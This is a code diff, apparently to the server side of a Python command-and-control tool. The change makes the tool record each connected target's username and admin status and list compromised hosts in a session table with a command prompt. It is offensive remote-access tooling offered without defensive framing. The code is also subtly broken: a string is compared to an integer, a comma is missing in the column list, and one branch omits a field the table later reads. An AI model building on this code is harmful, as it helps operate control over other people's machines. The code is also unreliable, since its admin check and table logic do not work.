@@ -39,6 +39,12 @@ def message_handler():
             break
         try:
             remote_target, remote_ip = sock.accept()
+            username = remote_target.recv(1024).decode()
+            admin = remote_target.recv(1024).decode()
+            if admin == 1:
+                isAdmin = 'Yes'
+            else:
+                isAdmin = 'No'
             current_time = time.strftime("%H:%M:%S", time.localtime())
             date = datetime.now()
             time_stamp = (
@@ -46,11 +52,12 @@ def message_handler():
             host_name = socket.gethostbyaddr(remote_ip[0])
             if host_name is not None:
                 sessions.append(
-                    [remote_target, f"{host_name[0]}@{remote_ip[0]}", time_stamp])
+                    [remote_target, f"{host_name[0]}@{remote_ip[0]}", time_stamp, username, isAdmin])
                 print(
                     f'\n[*] Connection received from {host_name[0]}@{remote_ip[0]} \nEnter command#> ', end='')
             else:
-                sessions.append([remote_target, remote_ip[0], time_stamp])
+                sessions.append(
+                    [remote_target, remote_ip[0], time_stamp, username])
                 print(
                     f'\n[*] Connection received from {remote_ip[0]} \nEnter command#> ', end='')
         except:
@@ -100,12 +107,12 @@ if __name__ == '__main__':
                 session_counter = 1
                 if command.split(' ')[1] == '-l':
                     table = PrettyTable()
-                    table.field_names = ['Session', 'Status', 'Username',
+                    table.field_names = ['Session', 'Status', 'Username', 'Admin'
                                          'Target', 'Connection Time']
                     table.padding_width = 2
                     for target in sessions:
                         table.add_row(
-                            [session_counter, 'Placeholder', 'Placeholder', target[1], target[2]])
+                            [session_counter, 'Placeholder', target[3], target[4], target[1], target[2]])
                         session_counter += 1
                     print(table)
                 if command.split(' ')[1] == '-i':
